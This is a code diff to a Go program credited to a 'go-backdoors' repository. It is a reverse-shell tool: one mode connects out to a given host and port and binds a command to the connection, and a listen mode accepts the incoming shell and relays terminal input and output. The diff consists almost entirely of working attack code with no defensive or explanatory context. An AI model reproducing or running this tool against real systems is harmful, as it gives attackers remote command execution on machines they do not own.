@@ -1,80 +1,43 @@
+// https://github.com/LukeDSchenk/go-backdoors/blob/master/revshell.go
+
 package main
 
 import (
 	"flag"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"os"
 	"os/exec"
-	"strconv"
 )
 
+const proto = "tcp"
+
+type Progress struct {
+	bytes uint64
+}
+
 func main() {
-	connectCommand := flag.NewFlagSet("connect", flag.ExitOnError)
-	listenCommand := flag.NewFlagSet("listen", flag.ExitOnError)
+	var host, command string
+	var port int
+	var listen bool
 
-	connectHost := connectCommand.String("host", "", "Host to connnect")
-	connectPort := connectCommand.Int("port", 4444, "Port to connect")
-	connectCMD := connectCommand.String("cmd", "/bin/bash", "Command to execute")
+	flag.StringVar(&host, "host", "", "host to connect to")
+	flag.IntVar(&port, "port", 4444, "port to connect to")
+	flag.StringVar(&command, "exec", "", "command to execute")
+	flag.BoolVar(&listen, "listen", false, "listen for incoming connections")
 
-	listenHost := listenCommand.String("host", "", "Host to listen")
-	listenPort := listenCommand.Int("port", 4444, "Port to listen")
+	flag.Parse()
 
-	if len(os.Args) < 2 {
-		fmt.Println("\"connect\" or \"listen\" subcommand is required")
-		os.Exit(1)
+	if listen && command == "" {
+		StartServer(proto, port)
+	} else if host != "" {
+		StartRevShell(proto, host, port, command)
+	} else {
+		flag.Usage()
 	}
 
-	switch os.Args[1] {
-	case "connect":
-		connectCommand.Parse(os.Args[2:])
-	case "listen":
-		listenCommand.Parse(os.Args[2:])
-	default:
-		fmt.Println("\"connect\" or \"listen\" subcommand is required")
-		os.Exit(1)
-	}
-
-	if connectCommand.Parsed() {
-		// Required Flags
-		if *connectHost == "" {
-			connectCommand.PrintDefaults()
-			os.Exit(1)
-		}
-
-		if *connectPort < 0 || *connectPort > 65536 {
-			fmt.Println("[-] Err: Invalid port")
-			connectCommand.PrintDefaults()
-			os.Exit(1)
-		}
-
-		if *connectCMD == "" {
-			connectCommand.PrintDefaults()
-			os.Exit(1)
-		}
-
-		// Print
-		fmt.Printf("Host: %s, Port: %d Command: %s \n", *connectHost, *connectPort, *connectCMD)
-		revConnect(*connectHost, *connectPort, *connectCMD)
-	}
-
-	if listenCommand.Parsed() {
-		// Required Flags
-		if *listenHost == "" {
-			connectCommand.PrintDefaults()
-			os.Exit(1)
-		}
-
-		if *listenPort < 0 || *listenPort > 65536 {
-			fmt.Println("[-] Err: Invalid port")
-			connectCommand.PrintDefaults()
-			os.Exit(1)
-		}
-
-		// Print
-		fmt.Printf("Host: %s, Port: %d \n", *listenHost, *listenPort)
-	}
 }
 
 func createShell(connection net.Conn, command string) {
@@ -93,9 +56,22 @@ func createShell(connection net.Conn, command string) {
 	cmd.Run()
 }
 
-func revConnect(host string, port int, cmd string) {
-	// Create a new connection
-	connection, err := net.Dial("tcp", host+":"+strconv.Itoa(port))
+func StartServer(proto string, port int) {
+	ln, err := net.Listen(proto, fmt.Sprintf(":%d", port))
+	if err != nil {
+		log.Fatalln(err)
+	}
+	log.Println("Listening on", fmt.Sprintf("%s:%d", proto, port))
+	con, err := ln.Accept()
+	if err != nil {
+		log.Fatalln(err)
+	}
+	log.Printf("[%s]: Connection has been opened\n", con.RemoteAddr())
+	TransferStreams(con)
+}
+
+func StartRevShell(proto string, host string, port int, command string) {
+	connection, err := net.Dial(proto, fmt.Sprintf("%s:%d", host, port))
 	if err != nil {
 		log.Println("An error occurred trying to connect to the target:", err)
 		os.Exit(1)
@@ -103,8 +79,30 @@ func revConnect(host string, port int, cmd string) {
 
 	log.Println("Successfully connected to the target")
 
-	createShell(connection, cmd)
+	createShell(connection, command)
 }
 
-func listener() {
+func TransferStreams(con net.Conn) {
+	c := make(chan Progress)
+
+	// Read from Reader and write to Writer until EOF
+	copy := func(r io.ReadCloser, w io.WriteCloser) {
+		defer func() {
+			r.Close()
+			w.Close()
+		}()
+		n, err := io.Copy(w, r)
+		if err != nil {
+			log.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
+		}
+		c <- Progress{bytes: uint64(n)}
+	}
+
+	go copy(con, os.Stdout)
+	go copy(os.Stdin, con)
+
+	p := <-c
+	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been received\n", con.RemoteAddr(), p.bytes)
+	p = <-c
+	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
 }
